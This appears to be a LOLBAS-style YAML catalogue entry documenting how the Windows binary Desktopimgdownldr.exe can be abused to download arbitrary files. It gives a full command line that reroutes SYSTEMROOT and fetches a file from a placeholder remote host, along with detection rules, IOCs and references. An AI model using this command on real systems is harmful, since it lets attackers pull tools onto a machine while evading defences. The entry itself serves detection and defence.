---
Name: Desktopimgdownldr.exe
Description: Windows binary used to configure lockscreen/desktop image
Author: Gal Kristal
Created: 2020-06-28
Commands:
  - Command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
    Description: Downloads the file and sets it as the computer's lockscreen
    Usecase: Download arbitrary files from a web server
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10
Full_Path:
  - Path: c:\windows\system32\desktopimgdownldr.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_desktopimgdownldr.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/file_event/win_susp_desktopimgdownldr_file.yml
  - Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/command_and_control_remote_file_copy_desktopimgdownldr.toml
  - IOC: desktopimgdownldr.exe that creates non-image file
  - IOC: Change of HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP\LockScreenImageUrl
Resources:
  - Link: https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/
Acknowledgement:
  - Person: Gal Kristal
    Handle: '@gal_kristal'
---
